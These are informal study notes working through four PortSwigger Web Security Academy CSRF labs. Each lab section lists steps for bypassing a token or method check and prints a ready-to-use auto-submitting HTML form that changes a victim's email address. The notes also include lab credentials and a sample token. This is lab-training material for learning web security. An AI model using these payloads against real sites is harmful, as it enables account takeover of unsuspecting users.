#### Reference: [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

##### Steps:
We need to change email through CSRF, when victim clik on link

For CSRF to work follow condition must meet:
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Only seassion cookie is there 
- **No unpredictable request parameters** - In http request there is only email parameter.

Cred - `wiener:peter`

1. Change the email.

2. Look for http request where email is changed.
   
3. check the conditions.

4. Make CSRF payload or you can use burpsuite pro for this.
```
<html> 
   <body>
	   <form action="https://vulnerable-website.com/email/change" method="POST">  
		   <input type="hidden" name="email" value="pwned@evil-user.net" />
	   </form>  
	   <script>
		   document.forms[0].submit();
	   </script>
	</body>
</html>
```
5.  Put this is server and click on store and  Send it to the Victim.

6. Make sure that you change email every time you send.

7. And check all parameter such as: action:`victim email change path`, email change, method.

There you go !!!

---
---
# Bypassing CSRF token validation

#### Reference: [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

##### Steps:

Let's look for condition for CSRF to work.
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Not setifies because there is one more parameter, srf value.
- **No unpredictable request parameters** - In http request there is only email parameter.

csrf parameter is there to prevent the csrf from being sussesful.

But there is one more ways.
Website strick check every parameter for csrf when method is `POST` But sometimes with `GET` Method you can achive CSRF, by changing `POST` to `GET`.

1. Change the email.

2. Look for http request where email is changed.
   
3. check the conditions, if conditions are not satify try using GET to bypass CSRF token.

4. Make CSRF payload or you can use burpsuite pro for this.
```
<html> 
   <body>
	   <form action="https://vulnerable-website.com/email/change" method="GET">  
		   <input type="hidden" name="email" value="pwned@evil-user.net" />
	   </form>  
	   <script>
		   document.forms[0].submit();
	   </script>
	</body>
</html>

```

5. Put this is server and click on store and  Send it to the Victim.

6. Make sure that you change email every time you send.

7. And check all parameter such as: action:`victim email change path`, email change, method.

There you go !!!

---


#### Reference: [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

##### Analysis:
For this lab to exploit we need to change the email.
And for changing the email 3 condition must meet.
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Not setifies because there is one more parameter, srf value.
- **No unpredictable request parameters** - In http request there is only email parameter.

But In this lab when you change the email there is csrf tooken means - 3rd condition doesn't fullfil.

##### CSRF Tooken Analysis
1. As we know by previos method we can change the request method from POST to GET.

2. We can remove the CSRF tooken from the request message.
	1. This method worked in this lab, we can remove the csrf tooken and still email get change.
and send it to the victim

##### Steps:

1. we login in using `wiener:peter`.

2. first we change the email and analyse `/my-account/change-email` request message.

3. when you anaylse change-email request message you can try two thing.
	1. change the request method from POST to GET (But doesn't work).
	2. Remove the CSRF tooken, and when you send request without csrf tooken you will see that email is change without CRSF tooken.

4. Now you need to make html page which automatically change email and send it to victim.

5. Go to server expoilt and inside body poast email change form.

```
<html>
  <body>
    <div>
         <form action="https://Lab-ID.web-security-academy.net/my-account/change-email" method="POST">
             <input required type="hidden" name="email" value="teesst@test.ac">
         </form>
         <script>
             document.forms[0].submit();
		 </script>
    </div>
  </body>
</html>
```

6. Inside that payload you can see that there is no csrf value.

7. Now send it to the victim.


There you go !!!

---
#### Reference: [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

##### Analysis:
For this lab to exploit we need to change the email.
And for changing the email 3 condition must meet.
- **A relevant action** - Email is changing.
- **Cookie-based session handling** - Not setifies because there is one more parameter, srf value.
- **No unpredictable request parameters** - In http request there is only email parameter.

But In this lab when you change the email there is csrf tooken means - 3rd condition doesn't fullfil.
We have two id `wiener:peter` and `carlos:montoya`
##### CSRF Tooken Analysis
1. As we know by previos method we can change the request method from POST to GET.
2. We can remove the CSRF tooken from the request message.
3. We can replace once Victim CSRF Tooken with Attacker CSRF Tooken.
	1. we can take attacker csrf tooken.
	2. Plase csrf tooken in payload.
	3. and send it to vicitm to change the email if with attacker email id.
	4. Remember - csrf tooken change after every request. attacker need to update csrf tooken every time.

##### Steps:
1. We can take carlos as attacker and wiener as victim.

2. Login as wiener and chage the email id.

3. Go to Burp and send `POST /my-account/change-email` wiener request to reapter.

4. Log in as carlos inside incognito mode.

5. Inside request message of wiener we have csrf value.
	1. We can change the request method from POST to GET (Doesn't work).
	2. We can remove the csrf tooken (Doesn't work).
	3.  Copy the CSRF value of carlos and past in wiener csrf value (It worked).

6. Now we know that by another user csrf value we can change the email id. Because seassion id is not tied to csrf.

7. Now copy the Fresh CSRF tooken and go to server exploit.

8. Inside server exploit body.
```
<html>
  <body>
    <div>
         <form action="https://Lab-ID.web-security-academy.net/my-account/change-email" method="POST">
             <input required type="hidden" name="email" value="teesst@test.ac">
             <input required type="hidden" name="csrf"  value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
         </form>
         <script>
             document.forms[0].submit();
		 </script>
    </div>
  </body>
</html>

```
8. Inside the payload change the value of csrf and email id to attacker csrf and email id.

9. Send it to the victim.

There you go !!!

---
